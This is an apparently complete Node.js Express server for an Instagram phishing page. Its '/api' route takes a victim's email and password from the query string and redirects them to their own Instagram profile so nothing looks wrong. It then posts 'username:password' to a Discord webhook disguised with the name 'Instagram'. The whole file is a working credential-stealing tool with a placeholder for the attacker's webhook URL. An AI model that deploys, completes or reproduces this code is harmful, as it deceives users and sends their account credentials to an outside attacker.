const express = require('express');
const path = require('path');
const app = express();
const ejs = require('ejs');
const bodyParser = require("body-parser");
const { Webhook } = require('discord-webhook-node');
const HOOK_URL = "WEBHOOK URL HERE" // Here webhook url
const hook = new Webhook(HOOK_URL);


function sendWebhook(username, password) {
    hook.setUsername('Instagram');

    let data = username + ':' + password;

    hook.send(data);
}

app.use( express.json() )

const listen = (s, u) => {

    app.get('', (req, res) => {
  
    })
};

app.set('view engine', 'ejs');
app.use(express.static("public"));

app.get('/', (req, res) => {
    res.render("index");
});

app.get('/api', (req, res) => {
    var username = req.query.email;
    var passwd = req.query.password;
    
    res.redirect("https://instagram.com/" + username)

    sendWebhook(username, passwd);

});

app.listen(3000, ()=>{
    console.log('listening on port 3000, server ready');
});